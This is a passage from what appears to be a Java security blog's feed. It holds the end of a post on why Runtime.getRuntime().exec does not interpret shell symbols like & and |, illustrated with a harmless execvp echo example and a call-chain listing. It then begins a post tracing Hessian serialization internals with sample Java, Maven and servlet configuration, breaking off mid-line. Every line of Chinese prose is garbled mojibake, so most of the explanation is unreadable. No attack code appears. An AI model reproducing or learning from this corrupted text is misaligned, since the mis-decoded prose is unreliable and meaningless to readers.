src="1577887148131-a6992150-ab3e-4e82-a93c-c5927f254965.png#align=left&display=inline&height=177&name=image.png&originHeight=292&originWidth=1230&size=31775&status=done&style=none&width=746" alt="image.png"></p><p><img src="1577887164428-ce737fbd-2e40-4702-820a-d45b23fa2954.png#align=left&display=inline&height=212&name=image.png&originHeight=354&originWidth=1244&size=39562&status=done&style=none&width=746" alt="image.png"></p><p>æ•…æ•°ç»„æƒ…å†µä¸‹ç­‰ä»·äº<br><img src="1577774188360-408cc7a4-bffe-4360-a859-f6e5b6b20a4f.png#align=left&display=inline&height=310&name=image.png&originHeight=620&originWidth=2246&size=111327&status=done&style=none&width=1123" alt="image.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬å†æ¥è€ƒå¯Ÿä¸€ä¸‹ï¼Œå­—ç¬¦ä¸²çš„æƒ…å†µçš„æƒ…å†µã€‚<br><img src="1577892353386-8b9d3cb5-d1a0-4c85-bd25-555f2dc45f04.png#align=left&display=inline&height=123&name=image.png&originHeight=202&originWidth=1226&size=21350&status=done&style=none&width=746" alt="image.png"><br><img src="1577892370784-45fd9581-4a77-41b5-99c3-70031f64f1f0.png#align=left&display=inline&height=121&name=image.png&originHeight=200&originWidth=1228&size=21627&status=done&style=none&width=746" alt="image.png"><br><img src="1577892391866-8b0b4576-a0c0-403b-8c41-13a8848e700b.png#align=left&display=inline&height=116&name=image.png&originHeight=192&originWidth=1234&size=22711&status=done&style=none&width=746" alt="image.png"><br><img src="1577892410406-82bd1a5c-7106-4077-ac07-fa9cb05d972b.png#align=left&display=inline&height=120&name=image.png&originHeight=190&originWidth=1182&size=21050&status=done&style=none&width=746" alt="image.png"><br><img src="1577892490628-2810628a-be2b-4db9-90e9-2845970634e4.png#align=left&display=inline&height=114&name=image.png&originHeight=184&originWidth=1206&size=20774&status=done&style=none&width=746" alt="image.png"><br><img src="1577892526498-a9e7e761-b5af-452f-82db-cf194e00d3bf.png#align=left&display=inline&height=114&name=image.png&originHeight=190&originWidth=1244&size=22425&status=done&style=none&width=746" alt="image.png"><br><img src="1577892558443-d47b918c-5559-47e7-b68b-8af7db6aec8e.png#align=left&display=inline&height=123&name=image.png&originHeight=202&originWidth=1230&size=22185&status=done&style=none&width=746" alt="image.png"></p><p>æ•…å­—ç¬¦ä¸²æ¨¡å¼ç­‰ä»·äº</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *arg[] = &#123;<span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, <span class="string">"'echo"</span>, <span class="string">"2333"</span>, <span class="string">"&amp;&amp;"</span>, <span class="string">"echo"</span>, <span class="string">"2333'"</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execvp(arg[<span class="number">0</span>],(<span class="keyword">char</span> **) arg);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="1577774099636-86487450-9203-4284-ba2c-d16a7e1297c8.png#align=left&display=inline&height=326&name=image.png&originHeight=652&originWidth=2692&size=136647&status=done&style=none&width=1346" alt="image.png"></p><p>æ‰€ä»¥æ•´ä¸ªè°ƒç”¨é“¾å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">java.lang.Runtime.exec(cmd);</span><br><span class="line">-&gt;java.lang.ProcessBuilder.start();</span><br><span class="line">--&gt;java.lang.ProcessImpl.start();</span><br><span class="line">---&gt;Java_java_lang_UNIXProcess_forkAndExec() in j2se&#x2F;src&#x2F;solaris&#x2F;native&#x2F;java&#x2F;lang&#x2F;UNIXProcess_md.c</span><br><span class="line">----&gt;forkæˆ–VFORKæˆ–POSIX_SPAWN</span><br><span class="line">-----&gt;execvp();</span><br></pre></td></tr></table></figure><h2 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h2><p>_Runtime.getRuntime().execæ‰§è¡Œå‘½ä»¤çš„æ—¶å€™å¹¶æ²¡æœ‰shellä¸Šä¸‹æ–‡ç¯å¢ƒæ‰€ä»¥æ— æ³•æŠŠç±»ä¼¼äº <code>&amp;</code> <code>|</code> <em>`</em><code>_</code> _è¿™æ ·çš„ç¬¦å·ç‰¹æ®Šå¤„ç†_çš„æœ¬è´¨æ˜¯execvpä¹Ÿç¡®å®ä¸æ”¯æŒshellä¸­çš„ç‰¹æ®Šç¬¦å·ã€‚è€Œä¹‹æ‰€ä»¥æ•°ç»„æƒ…å†µèƒ½æˆæ˜¯å› ä¸ºexecvpè°ƒç”¨äº† <code>/bin/bash</code> ï¼Œ<code>/bin/bash</code> è§£é‡Šäº† <code>&amp;</code> , <code>|</code> è¿™äº›ç‰¹æ®Šç¬¦å·å’Œexecvpæ²¡å…³ç³»ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="http://www.lmxspace.com/2019/10/08/Java%E4%B8%8B%E5%A5%87%E6%80%AA%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">Javaä¸‹å¥‡æ€ªçš„å‘½ä»¤æ‰§è¡Œ</a><br><a href="https://mp.weixin.qq.com/s/zCe_O37rdRqgN-Yvlq1FDg">åœ¨ Runtime.getRuntime().exec(String cmd) ä¸­æ‰§è¡Œä»»æ„shellå‘½ä»¤çš„å‡ ç§æ–¹æ³•</a><br><a href="https://www.cnblogs.com/LittleHann/p/4326828.html">Java JVMã€JNIã€Native Function Interfaceã€Create New Process Native Function API Analysis</a><br><a href="https://stackoverflow.com/questions/36221038/how-to-debug-a-forked-child-process-using-clion">How to debug a forked child process using CLion</a></p>]]></content>
    
    <summary type="html">
    
      è¿™ç¯‡æ–‡ç« ä¸»è¦ç›®çš„åœ¨äºå­¦ä¹ å‰äººæ–‡ç« ï¼Œå¹¶ä»æ›´æ·±å…¥ä¸€ç‚¹çš„è§’åº¦æ¢è®¨ä¸ºä»€ä¹ˆRuntime.getRuntime().execæŸäº›æ—¶å€™ä¼šå¤±æ•ˆè¿™ä¸ªé—®é¢˜ã€‚
    
    </summary>
    
    
      <category term="web security" scheme="https://cl0und.github.io/categories/web-security/"/>
    
    
      <category term="java" scheme="https://cl0und.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Hessian åºåˆ—åŒ–ä»£ç åˆ†æåŠä¸šåŠ¡åœºæ™¯å­¦ä¹ </title>
    <link href="https://cl0und.github.io/2020/01/03/Hessian-%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E4%B8%9A%E5%8A%A1%E5%9C%BA%E6%99%AF%E5%AD%A6%E4%B9%A0/"/>
    <id>https://cl0und.github.io/2020/01/03/Hessian-%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E4%B8%9A%E5%8A%A1%E5%9C%BA%E6%99%AF%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-01-03T14:21:42.000Z</published>
    <updated>2020-07-11T08:03:08.065Z</updated>
    
    <content type="html"><![CDATA[<!-- Hessianæ˜¯ä¸€ä¸ªè½»é‡çº§çš„remotingonhttpå·¥å…·ï¼Œä½¿ç”¨ç®€å•çš„æ–¹æ³•æä¾›äº†RMIçš„åŠŸèƒ½ --><!-- more --><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>Hessianæ˜¯ä¸€ä¸ªè½»é‡çº§çš„remotingonhttpå·¥å…·ï¼Œä½¿ç”¨ç®€å•çš„æ–¹æ³•æä¾›äº†RMIçš„åŠŸèƒ½ã€‚æ—©åœ¨08å¹´æœ‰äººåšè¿‡æµ‹è¯•ï¼šä¸€ä¸ªUserDataç±»ï¼Œæœ‰ä¸€ä¸ªå­—ç¬¦ä¸²å±æ€§ï¼Œä¸€ä¸ªæ—¥æœŸå±æ€§,ä¸€ä¸ªdoubleå±æ€§ï¼Œåˆ†åˆ«ç”¨java,hessianæ¥åºåˆ—åŒ–ä¸€ç™¾ä¸‡æ¬¡,ç»“æœè®©äººåƒæƒŠ,ä¸æ­¢æ˜¯hessianåºåˆ—åŒ–çš„é€Ÿåº¦è¦æ¯”javaçš„å¿«ä¸Šä¸€å€ï¼Œè€Œä¸”hessianåºåˆ—åŒ–åçš„å­—èŠ‚æ•°ä¹Ÿè¦æ¯”javaçš„å°‘ä¸€å€ã€‚</p><h2 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h2><p>åºåˆ—åŒ–å®è§‚æ¥çœ‹å°±å››æ­¥</p><ol><li>å»ºç«‹è¿›è¡Œåºåˆ—åŒ–çš„å·¥å‚ç±»</li><li>ç”¨å·¥å‚ç±»æ‰¾åˆ°è¦è¦è¿›è¡Œåºåˆ—åŒ–ç±»å¯¹åº”çš„åºåˆ—åŒ–å™¨</li><li>åºåˆ—åŒ–å™¨å¯¹å°†è¿›è¡Œåºåˆ—åŒ–çš„å¯¹è±¡è¿›è¡Œå†…çœ</li><li>å†…çœå®Œæˆåè°ƒç”¨åºåˆ—åŒ–å™¨çš„writeObjectï¼ˆwriteObjectä¸­æŒ‰ç…§ä¸€å®šè§„åˆ™æŠŠæ•°æ®å†™å…¥byteæµï¼‰</li></ol><p>ä¸‹é¢ç”¨Hessianç®€å•åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡æ¥çœ‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    User() &#123;</span><br><span class="line">        age = <span class="number">18</span>;</span><br><span class="line">        name = <span class="string">"cl0und"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HessianTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        ByteArrayOutputStream os=<span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        HessianOutput output=<span class="keyword">new</span> HessianOutput(os);</span><br><span class="line">        output.writeObject(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å»ºç«‹è¿›è¡Œåºåˆ—åŒ–çš„å·¥å‚ç±»"><a href="#å»ºç«‹è¿›è¡Œåºåˆ—åŒ–çš„å·¥å‚ç±»" class="headerlink" title="å»ºç«‹è¿›è¡Œåºåˆ—åŒ–çš„å·¥å‚ç±»"></a>å»ºç«‹è¿›è¡Œåºåˆ—åŒ–çš„å·¥å‚ç±»</h3><p>æŠŠByteArrayOutputStreamæ”¾å…¥äº†HessianOutputä¸­å…¸å‹çš„è£…é¥°å™¨æ¨¡å¼ã€‚<br><img src="1578018650932-4f7b0b12-c08d-49fd-9b13-a106a7241095.png" alt="image.png"></p><p>æ–°å»ºåºåˆ—å·¥å‚ç±»ï¼ˆåç»­ä¼šé€šè¿‡å·¥å‚ç±»æ¥å¯»æ‰¾ç±»çš„å¯¹åº”åºåˆ—åŒ–å™¨ï¼‰ã€‚<br><img src="1578018510750-27953aaa-dcd1-4479-9534-9324d5dbaef7.png" alt="image.png"></p><p>å·¥å‚ç±»çš„åˆ›å»ºè¿‡ç¨‹ä¸­ï¼Œåœ¨ç±»é™æ€å—ä¸­åŠ å…¥äº†javaå„ç§ç±»å‹çš„ååºåˆ—å™¨ä»¥åŠå’ŒHessianæœ‰å…³çš„ååºåˆ—å™¨ã€‚è¿™é‡Œå’Œåºåˆ—åŒ–æ²¡å…³ç³»ï¼Œåªæ˜¯æä¸€å˜´ã€‚<img src="1578056872628-e9e64d41-63d6-4a29-851e-31f645c46dcb.png" alt="image.png"></p><p>åœ¨ç±»åˆå§‹åŒ–å®Œæˆåï¼Œæ­£å¼è¿›å…¥SerializerFactoryçš„æ„é€ æ–¹æ³•ã€‚å¯ä»¥çœ‹åˆ°SerializerFactoryå…è®¸ä¸å®‰å…¨çš„åºåˆ—åŒ–ï¼Œè®¾ç½®é»˜è®¤çš„ä¸Šä¸‹æ–‡å·¥å‚ç±»æ˜¯_contextFactoryï¼Œè¿™ä¸ª_contextFactoryæ˜¯ç”Ÿäº§åºåˆ—åŒ–å™¨çš„å·¥å‚ã€‚<br><img src="1578018782918-44d51486-ba54-496b-b388-08cce55da23f.png" alt="image.png"></p><p><img src="1578020378163-c8312b90-7712-4eee-9793-98befa59ba79.png" alt="image.png"></p><h3 id="ç”¨å·¥å‚ç±»æ‰¾åˆ°è¦è¦è¿›è¡Œåºåˆ—åŒ–ç±»å¯¹åº”çš„åºåˆ—åŒ–å™¨"><a href="#ç”¨å·¥å‚ç±»æ‰¾åˆ°è¦è¦è¿›è¡Œåºåˆ—åŒ–ç±»å¯¹åº”çš„åºåˆ—åŒ–å™¨" class="headerlink" title="ç”¨å·¥å‚ç±»æ‰¾åˆ°è¦è¦è¿›è¡Œåºåˆ—åŒ–ç±»å¯¹åº”çš„åºåˆ—åŒ–å™¨"></a>ç”¨å·¥å‚ç±»æ‰¾åˆ°è¦è¦è¿›è¡Œåºåˆ—åŒ–ç±»å¯¹åº”çš„åºåˆ—åŒ–å™¨</h3><p>æ ¹æ®ä¼ å…¥ç±»å‹è·å–ç›¸åº”çš„åºåˆ—åŒ–å™¨ã€‚<br><img src="1578018871570-0e8cbc5b-bc58-460c-b6d2-d44fac4f9232.png" alt="image.png"></p><p>è·å–åºåˆ—åŒ–å™¨çš„è§„åˆ™æ˜¯å¦‚æœ_cachedSerializerMapé‡Œé¢åˆå°±ç›´æ¥ä»é‡Œé¢å–ï¼Œå¦‚æœæ²¡æœ‰å°±ç”¨loadSerializeræ‰¾ï¼Œæ‰¾å‡ºæ¥çš„åŠ å…¥_cachedSerializerMapé¿å…äºŒæ¬¡åŠ è½½ã€‚<br><img src="1578018931958-a405efcd-b970-48fc-a579-6ab9dd9adbd5.png" alt="image.png"></p><p>loadSerializeræ‰¾çš„é€»è¾‘æ˜¯å…ˆçœ‹æœ‰æ²¡æœ‰å…¶å®ƒå·¥å‚ç±»ï¼Œå¦‚æœæœ‰å°±ç”¨ï¼Œå¦‚æœæ²¡æœ‰å°±ç”¨_contextFactoryé€ ã€‚<br><img src="1578019332986-acb7d611-ab63-4eab-9417-1595a87e8f89.png" alt="image.png"></p><p>å› ä¸ºUseræ˜¯è‡ªå»ºç±»å‹_contextFactoryé€ ä¸å‡ºå¯¹åº”åºåˆ—åŒ–å™¨ã€‚<br><img src="1578020722501-2751e375-f821-4b90-a060-d4a89929b36f.png" alt="image.png"></p><p>ä¸‹ä¸€æ­¥å°è¯•getCustomSerializeræ¥æ‰¾åºåˆ—åŒ–å™¨ï¼Œçœ‹æ–¹æ³•çš„æ„æ€åº”è¯¥æ˜¯æ‰¾æ˜¯å¦æœ‰å®¢æˆ·è‡ªå·±å®šåˆ¶çš„åºåˆ—åŒ–å™¨ã€‚ç”Ÿæˆåºåˆ—å™¨è§„åˆ™æ˜¯ï¼šå¦‚æœ_customSerializerMapæœ‰å°±ç›´æ¥è¿”å›ï¼Œå¦‚æœæ²¡æœ‰å°±æŒ‰ç…§_ç±»å+HessianSerializer_çš„è§„åˆ™æ¥æ‰¾ã€‚å¾ˆé—æ†¾æˆ‘ä»¬å¹¶æ²¡æœ‰å¯¹Useråšä¸ªæ€§åŒ–å®šåˆ¶ã€‚<br><img src="1578020850955-a7f2fca3-0f4d-4446-8c74-78584c1adcfe.png" alt="image.png"></p><p>å› ä¸ºæ²¡æœ‰æˆ‘ä»¬æ²¡æœ‰å¯¹Useråšä¸ªæ€§åŒ–çš„åºåˆ—åŒ–å™¨ï¼Œæ‰€ä»¥æœ€åä¼šè°ƒç”¨getDefaultSerializeræ¥è¿”å›é»˜è®¤åºåˆ—åŒ–å™¨ã€‚åˆå› ä¸ºUseræ—¢ä¸æ˜¯å†…ç½®ç±»ä¹Ÿä¸æ˜¯å’Œhessianæœ‰å…³çš„ç‰¹æ®Šç±»ä½†æ˜¯å…è®¸äº†ä¸å®‰å…¨çš„åºåˆ—åŒ–ï¼Œæ‰€ä»¥æœ€åè¢«é€‰ä¸­çš„åºåˆ—åŒ–å™¨æ˜¯UnsafeSerializerã€‚<br><img src="1578036755615-9fda6962-c2ee-4250-ae0d-bf9ac12f1573.png" alt="image.png"></p><h3 id="åºåˆ—åŒ–å™¨å¯¹åºåˆ—åŒ–å¯¹è±¡è¿›è¡Œå†…çœ"><a href="#åºåˆ—åŒ–å™¨å¯¹åºåˆ—åŒ–å¯¹è±¡è¿›è¡Œå†…çœ" class="headerlink" title="åºåˆ—åŒ–å™¨å¯¹åºåˆ—åŒ–å¯¹è±¡è¿›è¡Œå†…çœ"></a>åºåˆ—åŒ–å™¨å¯¹åºåˆ—åŒ–å¯¹è±¡è¿›è¡Œå†…çœ</h3><p>åœ¨æ„é€ æ–¹æ³•ä¸­ä½¿ç”¨introspectè¿›è¡Œå†…çœã€‚<br><img src="1578022299793-2d917569-2b48-4a40-b641-1f7dbd68d54d.png" alt="image.png"></p><p><img src="1578022661148-31eaa214-4623-4d53-8c03-d54625986822.png" alt="image.png"></p><p>introspectæœ€åå‡ æ­¥æ˜¯åœ¨ä¸ºç±»é‡Œé¢çš„å±æ€§æ‰¾åºåˆ—åŒ–å™¨ï¼ˆgetFiledSerializerï¼‰ã€‚<br><img src="1578026402777-b2f40c49-d717-475e-9874-d7244f823d85.png" alt="image.png"></p><p>æ¯”å¦‚è¿™é‡ŒUserç±»ä¸­nameå±æ€§æ˜¯Stringï¼Œå°±åˆ›å»ºé’ˆå¯¹Stringçš„åºåˆ—åŒ–å™¨ã€‚<br><img src="1578026468907-63b0955a-6cb0-4fde-b2b8-079ec936e618.png" alt="image.png"></p><p>Stringçš„åºåˆ—åŒ–å™¨åŒ…å«äº†fieldç±»åŠå…¶åç§»é‡ã€‚<br><img src="1578035822247-43e9dad1-3122-4c40-861c-9f05f0346dc2.png" alt="image.png"></p><p>åˆ›å»ºç±»åŠåŠå…¶å­—æ®µåºåˆ—åŒ–å™¨åä¸€è·¯å‘å¤–ä¼ ï¼Œç„¶åè°ƒç”¨writeObjectã€‚<br><img src="1578054376515-e69a20a8-3ee8-4a8e-9a16-f422e144c663.png" alt="image.png"></p><p><img src="1578054878060-3ec4b6c4-b62d-44e3-b0af-76d33c0a5385.png" alt="image.png"></p><p>writeObjectBegin å†™äº†Objectçš„é­”æœ¯å¤´ã€é•¿åº¦ã€ç±»å<br><img src="1578059835151-a62d0cba-183f-44b6-85e2-a59c69e2cb89.png" alt="image.png"><br><img src="1578059865287-b2958526-3372-450b-90c6-3900ad380034.png" alt="image.png"><br>writeObject10 è´Ÿè´£åºåˆ—åŒ–å­—æ®µ<br><img src="1578055007325-a2d4943e-0e7a-41e5-b9ce-2b92ccf5ed7e.png" alt="image.png"></p><p>å…ˆæ˜¯å†™è¦åºåˆ—åŒ–çš„å­—ç¬¦ä¸²é­”æœ¯å€¼ã€å­—æ®µåé•¿åº¦ã€å­—æ®µåï¼Œå…¶ä¸­ <code>os.write(83)</code> ä»£è¡¨ <code>S</code> ä»£è¡¨å­—ç¬¦ä¸²ã€‚<img src="1578055257437-7c63a33c-2d8b-4e64-971b-c70f9519f5dc.png" alt="image.png"></p><p>Stringç±»å‹å­¦åºåˆ—åŒ–çš„æ—¶å€™<br><img src="1578055611722-af337b28-b489-4381-80b9-831a7fa87df4.png" alt="image.png"><br><img src="1578055873704-aa60f07f-6ba7-4cc8-9727-bec3787f9861.png" alt="image.png"></p><p>intç±»å‹åºåˆ—åŒ–çš„æ—¶å€™<br><img src="1578055767135-360790fd-1b05-4b4c-a963-ffc97ca83946.png" alt="image.png"><br><img src="1578055703641-922968f1-89be-4dae-8423-5fcf0cb4f734.png" alt="image.png"></p><p>æœ€åçš„ç»“æœ<br><img src="1578059987421-90e3ff15-6b85-448e-9785-a08152c6ef01.png" alt="image.png"></p><h2 id="ä¸šåŠ¡åœºæ™¯"><a href="#ä¸šåŠ¡åœºæ™¯" class="headerlink" title="ä¸šåŠ¡åœºæ™¯"></a>ä¸šåŠ¡åœºæ™¯</h2><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>è¯´ç©¿äº†å°±æ˜¯RPCï¼Œç”¨å®é™…çš„ä»£ç æ¥çœ‹çœ‹<br>pom.xmlåŠ å…¥</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hessian<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.60<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">web-app</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"http://java.sun.com/dtd/web-app_2_3.dtd"</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HessianServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.caucho.hessian.server.HessianServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>service-class<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>org.syclover.hessian.BasicService<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HessianServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/api/service<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä»£ç å¿˜è®°ä»ç½‘ä¸Šå“ªé‡Œcopyçš„äº†ï¼Œä¾µåˆ ã€‚</p><p>client/serverç«¯å…±æœ‰ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.syclover.hessian;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IBasicApi</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* è®¾ç½®ç”¨æˆ·å */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">setUserName</span><span class="params">(String name)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* è·å–é—®å€™ */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* è·å–ç”¨æˆ·ä¿¡æ¯ */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">getUser</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>clientç«¯ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.syclover.hessian;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.client.HessianProxyFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClientTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String url = <span 